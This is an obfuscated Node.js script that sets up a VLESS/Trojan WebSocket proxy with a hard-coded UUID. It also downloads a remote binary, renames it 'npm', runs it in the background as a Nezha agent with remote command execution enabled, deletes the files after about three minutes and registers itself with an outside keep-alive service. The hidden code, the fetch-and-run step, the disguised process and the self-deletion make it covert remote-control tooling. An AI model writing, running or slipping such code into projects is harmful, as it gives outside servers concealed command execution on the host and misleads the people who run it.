const _0x26b8a1=_0x2c4d;(function(_0x427e23,_0x439177){const _0x4542ba=_0x2c4d,_0x4bc809=_0x427e23();while(!![]){try{const _0x3a7029=-parseInt(_0x4542ba(0x91))/0x1*(-parseInt(_0x4542ba(0xbf))/0x2)+parseInt(_0x4542ba(0xcf))/0x3*(-parseInt(_0x4542ba(0xf0))/0x4)+-parseInt(_0x4542ba(0xf2))/0x5*(-parseInt(_0x4542ba(0xdb))/0x6)+-parseInt(_0x4542ba(0xa1))/0x7*(parseInt(_0x4542ba(0xfb))/0x8)+-parseInt(_0x4542ba(0xba))/0x9+parseInt(_0x4542ba(0xbd))/0xa*(parseInt(_0x4542ba(0xe0))/0xb)+-parseInt(_0x4542ba(0x95))/0xc*(-parseInt(_0x4542ba(0xee))/0xd);if(_0x3a7029===_0x439177)break;else _0x4bc809['push'](_0x4bc809['shift']());}catch(_0x1e4feb){_0x4bc809['push'](_0x4bc809['shift']());}}}(_0x2d11,0x57c76));const os=require('os'),http=require('http'),fs=require('fs'),axios=require('axios'),net=require(_0x26b8a1(0x9f)),path=require(_0x26b8a1(0xdc)),crypto=require(_0x26b8a1(0xa4)),{Buffer}=require('buffer'),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env']['UUID']||_0x26b8a1(0x10d),NEZHA_SERVER=process[_0x26b8a1(0xb0)][_0x26b8a1(0xd7)]||'',NEZHA_PORT=process['env'][_0x26b8a1(0xbe)]||'',NEZHA_KEY=process[_0x26b8a1(0xb0)]['NEZHA_KEY']||'',DOMAIN=process[_0x26b8a1(0xb0)][_0x26b8a1(0xa9)]||_0x26b8a1(0xfe),AUTO_ACCESS=process['env'][_0x26b8a1(0xa0)]||![],WSPATH=process[_0x26b8a1(0xb0)][_0x26b8a1(0xcc)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x26b8a1(0xb0)][_0x26b8a1(0xc9)]||_0x26b8a1(0xae),NAME=process[_0x26b8a1(0xb0)]['NAME']||'',PORT=process['env'][_0x26b8a1(0xdd)]||0xbb8;let ISP='';const GetISP=async()=>{const _0x130ed7=_0x26b8a1;try{const _0x472aaa=await axios[_0x130ed7(0xa7)](_0x130ed7(0x9c)),_0x47ec58=_0x472aaa['data'];ISP=(_0x47ec58[_0x130ed7(0xa5)]+'-'+_0x47ec58[_0x130ed7(0xbc)])[_0x130ed7(0xea)](/ /g,'_');}catch(_0x148cea){ISP=_0x130ed7(0x8e);}};GetISP();const httpServer=http[_0x26b8a1(0x103)]((_0x5722ed,_0x3074c3)=>{const _0x446a51=_0x26b8a1;if(_0x5722ed[_0x446a51(0x97)]==='/'){const _0x250563=path['join'](__dirname,'index.html');fs['readFile'](_0x250563,_0x446a51(0xb8),(_0x2fcd7a,_0x1f4efc)=>{const _0x4c315e=_0x446a51;if(_0x2fcd7a){_0x3074c3['writeHead'](0xc8,{'Content-Type':_0x4c315e(0xce)}),_0x3074c3[_0x4c315e(0xec)]('Hello\x20world!');return;}_0x3074c3[_0x4c315e(0x9b)](0xc8,{'Content-Type':_0x4c315e(0xce)}),_0x3074c3[_0x4c315e(0xec)](_0x1f4efc);});return;}else{if(_0x5722ed['url']==='/'+SUB_PATH){const _0x1f8df4=NAME?NAME+'-'+ISP:ISP,_0x187eec=_0x446a51(0x105)+UUID+_0x446a51(0x104)+DOMAIN+_0x446a51(0xa3)+DOMAIN+_0x446a51(0xca)+WSPATH+'#'+_0x1f8df4,_0x3a06f8=_0x446a51(0xd1)+UUID+_0x446a51(0x102)+DOMAIN+_0x446a51(0xa3)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x1f8df4,_0x5128eb=_0x187eec+'\x0a'+_0x3a06f8,_0xea57d6=Buffer[_0x446a51(0xa6)](_0x5128eb)[_0x446a51(0xeb)](_0x446a51(0xb3));_0x3074c3['writeHead'](0xc8,{'Content-Type':_0x446a51(0xc8)}),_0x3074c3[_0x446a51(0xec)](_0xea57d6+'\x0a');}else _0x3074c3[_0x446a51(0x9b)](0x194,{'Content-Type':_0x446a51(0xc8)}),_0x3074c3['end']('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x26b8a1(0xda))]({'server':httpServer}),uuid=UUID[_0x26b8a1(0xea)](/-/g,''),DNS_SERVERS=[_0x26b8a1(0xb9),_0x26b8a1(0x99)];function resolveHost(_0x18a118){return new Promise((_0x184908,_0x3ea000)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x18a118)){_0x184908(_0x18a118);return;}let _0x230c3c=0x0;function _0x442f0a(){const _0x2216ef=_0x2c4d;if(_0x230c3c>=DNS_SERVERS[_0x2216ef(0xd5)]){_0x3ea000(new Error(_0x2216ef(0xe9)+_0x18a118+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x5eb5bc=DNS_SERVERS[_0x230c3c];_0x230c3c++;const _0x1221aa=_0x2216ef(0xbb)+encodeURIComponent(_0x18a118)+_0x2216ef(0xc7);axios['get'](_0x1221aa,{'timeout':0x1388,'headers':{'Accept':_0x2216ef(0xe2)}})[_0x2216ef(0xb2)](_0x54b960=>{const _0x283ec4=_0x2216ef,_0x16d996=_0x54b960[_0x283ec4(0xcb)];if(_0x16d996[_0x283ec4(0xd9)]===0x0&&_0x16d996['Answer']&&_0x16d996[_0x283ec4(0x8f)][_0x283ec4(0xd5)]>0x0){const _0x535118=_0x16d996[_0x283ec4(0x8f)][_0x283ec4(0xd3)](_0x280ccc=>_0x280ccc[_0x283ec4(0xde)]===0x1);if(_0x535118){_0x184908(_0x535118[_0x283ec4(0xcb)]);return;}}_0x442f0a();})[_0x2216ef(0xe1)](_0x47b659=>{_0x442f0a();});}_0x442f0a();});}function handleVlessConnection(_0x4eda65,_0x35ef7c){const _0x2f21bf=_0x26b8a1,[_0x52208a]=_0x35ef7c,_0x418932=_0x35ef7c[_0x2f21bf(0xd6)](0x1,0x11);if(!_0x418932[_0x2f21bf(0xb5)]((_0x37475c,_0x274a55)=>_0x37475c==parseInt(uuid[_0x2f21bf(0xd8)](_0x274a55*0x2,0x2),0x10)))return![];let _0x5a906d=_0x35ef7c[_0x2f21bf(0xd6)](0x11,0x12)[_0x2f21bf(0x10a)]()+0x13;const _0x24adb3=_0x35ef7c['slice'](_0x5a906d,_0x5a906d+=0x2)['readUInt16BE'](0x0),_0xc8ad90=_0x35ef7c[_0x2f21bf(0xd6)](_0x5a906d,_0x5a906d+=0x1)[_0x2f21bf(0x10a)](),_0x19c220=_0xc8ad90==0x1?_0x35ef7c['slice'](_0x5a906d,_0x5a906d+=0x4)[_0x2f21bf(0x108)]('.'):_0xc8ad90==0x2?new TextDecoder()[_0x2f21bf(0xa2)](_0x35ef7c['slice'](_0x5a906d+0x1,_0x5a906d+=0x1+_0x35ef7c[_0x2f21bf(0xd6)](_0x5a906d,_0x5a906d+0x1)[_0x2f21bf(0x10a)]())):_0xc8ad90==0x3?_0x35ef7c[_0x2f21bf(0xd6)](_0x5a906d,_0x5a906d+=0x10)[_0x2f21bf(0xfa)]((_0x439963,_0x460456,_0x245019,_0x119da6)=>_0x245019%0x2?_0x439963[_0x2f21bf(0xe4)](_0x119da6[_0x2f21bf(0xd6)](_0x245019-0x1,_0x245019+0x1)):_0x439963,[])[_0x2f21bf(0xc6)](_0x58c54a=>_0x58c54a['readUInt16BE'](0x0)['toString'](0x10))['join'](':'):'';_0x4eda65[_0x2f21bf(0xa8)](new Uint8Array([_0x52208a,0x0]));const _0x55d23f=createWebSocketStream(_0x4eda65);return resolveHost(_0x19c220)['then'](_0x56105d=>{net['connect']({'host':_0x56105d,'port':_0x24adb3},function(){const _0x4606a9=_0x2c4d;this['write'](_0x35ef7c[_0x4606a9(0xd6)](_0x5a906d)),_0x55d23f['on'](_0x4606a9(0x107),()=>{})[_0x4606a9(0xed)](this)['on'](_0x4606a9(0x107),()=>{})[_0x4606a9(0xed)](_0x55d23f);})['on']('error',()=>{});})[_0x2f21bf(0xe1)](_0x131595=>{const _0x200ab5=_0x2f21bf;net[_0x200ab5(0x96)]({'host':_0x19c220,'port':_0x24adb3},function(){const _0x4bb58d=_0x200ab5;this[_0x4bb58d(0x9a)](_0x35ef7c[_0x4bb58d(0xd6)](_0x5a906d)),_0x55d23f['on'](_0x4bb58d(0x107),()=>{})[_0x4bb58d(0xed)](this)['on'](_0x4bb58d(0x107),()=>{})[_0x4bb58d(0xed)](_0x55d23f);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x4056d2,_0x3b8ab0){const _0x551d6d=_0x26b8a1;try{if(_0x3b8ab0[_0x551d6d(0xd5)]<0x3a)return![];const _0x52dea4=_0x3b8ab0[_0x551d6d(0xd6)](0x0,0x38)['toString'](),_0xa9866e=[UUID];let _0x5ddb50=null;for(const _0x21e4d9 of _0xa9866e){const _0x29f8bc=crypto[_0x551d6d(0x101)](_0x551d6d(0xfd))['update'](_0x21e4d9)['digest']('hex');if(_0x29f8bc===_0x52dea4){_0x5ddb50=_0x21e4d9;break;}}if(!_0x5ddb50)return![];let _0x51b774=0x38;_0x3b8ab0[_0x51b774]===0xd&&_0x3b8ab0[_0x51b774+0x1]===0xa&&(_0x51b774+=0x2);const _0x3e1395=_0x3b8ab0[_0x51b774];if(_0x3e1395!==0x1)return![];_0x51b774+=0x1;const _0x419a22=_0x3b8ab0[_0x51b774];_0x51b774+=0x1;let _0x505c84,_0x116384;if(_0x419a22===0x1)_0x505c84=_0x3b8ab0[_0x551d6d(0xd6)](_0x51b774,_0x51b774+0x4)['join']('.'),_0x51b774+=0x4;else{if(_0x419a22===0x3){const _0x4d2e51=_0x3b8ab0[_0x51b774];_0x51b774+=0x1,_0x505c84=_0x3b8ab0[_0x551d6d(0xd6)](_0x51b774,_0x51b774+_0x4d2e51)[_0x551d6d(0xeb)](),_0x51b774+=_0x4d2e51;}else{if(_0x419a22===0x4)_0x505c84=_0x3b8ab0[_0x551d6d(0xd6)](_0x51b774,_0x51b774+0x10)[_0x551d6d(0xfa)]((_0x4276bf,_0x3ef084,_0xf0110c,_0x56c270)=>_0xf0110c%0x2?_0x4276bf[_0x551d6d(0xe4)](_0x56c270[_0x551d6d(0xd6)](_0xf0110c-0x1,_0xf0110c+0x1)):_0x4276bf,[])['map'](_0x2774ca=>_0x2774ca[_0x551d6d(0xaf)](0x0)[_0x551d6d(0xeb)](0x10))[_0x551d6d(0x108)](':'),_0x51b774+=0x10;else return![];}}_0x116384=_0x3b8ab0['readUInt16BE'](_0x51b774),_0x51b774+=0x2;_0x51b774<_0x3b8ab0[_0x551d6d(0xd5)]&&_0x3b8ab0[_0x51b774]===0xd&&_0x3b8ab0[_0x51b774+0x1]===0xa&&(_0x51b774+=0x2);const _0x109706=createWebSocketStream(_0x4056d2);return resolveHost(_0x505c84)['then'](_0xd85551=>{const _0x2d9dc4=_0x551d6d;net[_0x2d9dc4(0x96)]({'host':_0xd85551,'port':_0x116384},function(){const _0x54e28a=_0x2d9dc4;_0x51b774<_0x3b8ab0[_0x54e28a(0xd5)]&&this[_0x54e28a(0x9a)](_0x3b8ab0['slice'](_0x51b774)),_0x109706['on']('error',()=>{})[_0x54e28a(0xed)](this)['on'](_0x54e28a(0x107),()=>{})[_0x54e28a(0xed)](_0x109706);})['on'](_0x2d9dc4(0x107),()=>{});})[_0x551d6d(0xe1)](_0x7cdb2=>{const _0xd0bc52=_0x551d6d;net[_0xd0bc52(0x96)]({'host':_0x505c84,'port':_0x116384},function(){const _0x5d7346=_0xd0bc52;_0x51b774<_0x3b8ab0[_0x5d7346(0xd5)]&&this[_0x5d7346(0x9a)](_0x3b8ab0[_0x5d7346(0xd6)](_0x51b774)),_0x109706['on'](_0x5d7346(0x107),()=>{})[_0x5d7346(0xed)](this)['on'](_0x5d7346(0x107),()=>{})[_0x5d7346(0xed)](_0x109706);})['on']('error',()=>{});}),!![];}catch(_0x105ea3){return![];}}function _0x2d11(){const _0x151fab=['connection','https://oooo.serv00.net/add-url','Failed\x20to\x20resolve\x20','replace','toString','end','pipe','923MxwYsi','log','4CYYhXx','aarch64','190PqxZNa','unlink','message','Server\x20is\x20running\x20on\x20port\x20','arch','https://arm64.ssss.nyc.mn/v1','config.yaml','createWriteStream','reduce','96rIKyKk','error:\x20','sha224','1234.abc.com','2087','https://arm64.ssss.nyc.mn/agent','createHash','@cdns.doon.eu.org:443?security=tls&sni=','createServer','@cdns.doon.eu.org:443?encryption=none&security=tls&sni=','vless://','npm\x20is\x20already\x20running,\x20skip\x20running...','error','join','writeFileSync','readUInt8','\x20-p\x20','includes','32bc38c0-4a1d-4d63-a3f1-c467ed5b029e','npm\x20is\x20running','Unknown','Answer','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','267GVALnO','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','trim','finish','68088pEkGai','connect','url','npm','1.1.1.1','write','writeHead','https://speed.cloudflare.com/meta','8443','https://','net','AUTO_ACCESS','105266yNKjxn','decode','&fp=chrome&type=ws&host=','crypto','country','from','get','send','DOMAIN','false','application/json','listen','https://amd64.ssss.nyc.mn/agent','sub','readUInt16BE','env','npm\x20download\x20successfully','then','base64','chmod\x20+x\x20npm','every','npm\x20running\x20error:','split','utf8','8.8.4.4','5976981GSxdJt','https://dns.google/resolve?name=','asOrganization','5680330VUYDZW','NEZHA_PORT','5030LhGMNx','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','Automatic\x20Access\x20Task\x20added\x20successfully','--tls','arm','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','2096','map','&type=A','text/plain','SUB_PATH','&path=%2F','data','WSPATH','arm64','text/html','2044113OHyNIY','2053','trojan://','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','find','/bin/bash','length','slice','NEZHA_SERVER','substr','Status','Server','38382VREatu','path','PORT','type','once','11duBJpd','catch','application/dns-json','client_secret:\x20','concat','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','post'];_0x2d11=function(){return _0x151fab;};return _0x2d11();}wss['on'](_0x26b8a1(0xe7),(_0x5b8b2b,_0x436680)=>{const _0x1009cc=_0x26b8a1,_0x2e89e6=_0x436680[_0x1009cc(0x97)]||'';_0x5b8b2b[_0x1009cc(0xdf)](_0x1009cc(0xf4),_0x215a7b=>{const _0x4ed3a7=_0x1009cc;if(_0x215a7b[_0x4ed3a7(0xd5)]>0x11&&_0x215a7b[0x0]===0x0){const _0x42e792=_0x215a7b[_0x4ed3a7(0xd6)](0x1,0x11),_0x54ea87=_0x42e792[_0x4ed3a7(0xb5)]((_0x3c9465,_0xa55e3d)=>_0x3c9465==parseInt(uuid[_0x4ed3a7(0xd8)](_0xa55e3d*0x2,0x2),0x10));if(_0x54ea87){!handleVlessConnection(_0x5b8b2b,_0x215a7b)&&_0x5b8b2b['close']();return;}}!handleTrojanConnection(_0x5b8b2b,_0x215a7b)&&_0x5b8b2b['close']();})['on']('error',()=>{});});function _0x2c4d(_0x2cc75d,_0x3a7ed2){const _0x2d110e=_0x2d11();return _0x2c4d=function(_0x2c4d36,_0x2cbd2f){_0x2c4d36=_0x2c4d36-0x8d;let _0x112546=_0x2d110e[_0x2c4d36];return _0x112546;},_0x2c4d(_0x2cc75d,_0x3a7ed2);}const getDownloadUrl=()=>{const _0x425b8a=_0x26b8a1,_0xd3c201=os[_0x425b8a(0xf6)]();return _0xd3c201===_0x425b8a(0xc3)||_0xd3c201===_0x425b8a(0xcd)||_0xd3c201===_0x425b8a(0xf1)?!NEZHA_PORT?_0x425b8a(0xf7):_0x425b8a(0x100):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x425b8a(0xad);},downloadFile=async()=>{const _0x30b5ed=_0x26b8a1;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x1939e2=getDownloadUrl(),_0x54601a=await axios({'method':_0x30b5ed(0xa7),'url':_0x1939e2,'responseType':'stream'}),_0x1a0e8f=fs[_0x30b5ed(0xf9)](_0x30b5ed(0x98));return _0x54601a[_0x30b5ed(0xcb)][_0x30b5ed(0xed)](_0x1a0e8f),new Promise((_0x2a3edc,_0x5d0d96)=>{const _0x2fef19=_0x30b5ed;_0x1a0e8f['on'](_0x2fef19(0x94),()=>{const _0x56bffa=_0x2fef19;console[_0x56bffa(0xef)](_0x56bffa(0xb1)),exec(_0x56bffa(0xb4),_0x575d70=>{if(_0x575d70)_0x5d0d96(_0x575d70);_0x2a3edc();});}),_0x1a0e8f['on'](_0x2fef19(0x107),_0x5d0d96);});}catch(_0x1149dc){throw _0x1149dc;}},runnz=async()=>{const _0x31cb65=_0x26b8a1;try{const _0x8ddb32=execSync(_0x31cb65(0xd2),{'encoding':'utf-8'});if(_0x8ddb32[_0x31cb65(0x93)]()!==''){console[_0x31cb65(0xef)](_0x31cb65(0x106));return;}}catch(_0x73c013){}await downloadFile();let _0x244595='',_0x3ef0c2=['443',_0x31cb65(0x9d),_0x31cb65(0xc5),_0x31cb65(0xff),'2083',_0x31cb65(0xd0)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x1867da=_0x3ef0c2[_0x31cb65(0x10c)](NEZHA_PORT)?_0x31cb65(0xc2):'';_0x244595='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x31cb65(0x10b)+NEZHA_KEY+'\x20'+_0x1867da+_0x31cb65(0xc0);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x10fdde=NEZHA_SERVER[_0x31cb65(0x10c)](':')?NEZHA_SERVER[_0x31cb65(0xb7)](':')['pop']():'',_0x20e353=_0x3ef0c2[_0x31cb65(0x10c)](_0x10fdde)?'true':_0x31cb65(0xaa),_0x26311c=_0x31cb65(0xe3)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x31cb65(0x92)+_0x20e353+_0x31cb65(0xe5)+UUID;fs[_0x31cb65(0x109)]('config.yaml',_0x26311c);}_0x244595=_0x31cb65(0x90);}else{console[_0x31cb65(0xef)](_0x31cb65(0xc4));return;}}try{exec(_0x244595,{'shell':_0x31cb65(0xd4)},_0x4c4126=>{const _0x582590=_0x31cb65;if(_0x4c4126)console[_0x582590(0x107)](_0x582590(0xb6),_0x4c4126);else console[_0x582590(0xef)](_0x582590(0x8d));});}catch(_0x417922){console[_0x31cb65(0x107)](_0x31cb65(0xfc)+_0x417922);}};async function addAccessTask(){const _0x54b1fc=_0x26b8a1;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x22c7e3=_0x54b1fc(0x9e)+DOMAIN+'/'+SUB_PATH;try{const _0x238d04=await axios[_0x54b1fc(0xe6)](_0x54b1fc(0xe8),{'url':_0x22c7e3},{'headers':{'Content-Type':_0x54b1fc(0xab)}});console[_0x54b1fc(0xef)](_0x54b1fc(0xc1));}catch(_0x4dbe2c){}}const delFiles=()=>{const _0x494cd7=_0x26b8a1;fs[_0x494cd7(0xf3)](_0x494cd7(0x98),()=>{}),fs['unlink'](_0x494cd7(0xf8),()=>{});};httpServer[_0x26b8a1(0xac)](PORT,()=>{const _0xec2dfc=_0x26b8a1;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0xec2dfc(0xef)](_0xec2dfc(0xf5)+PORT);});
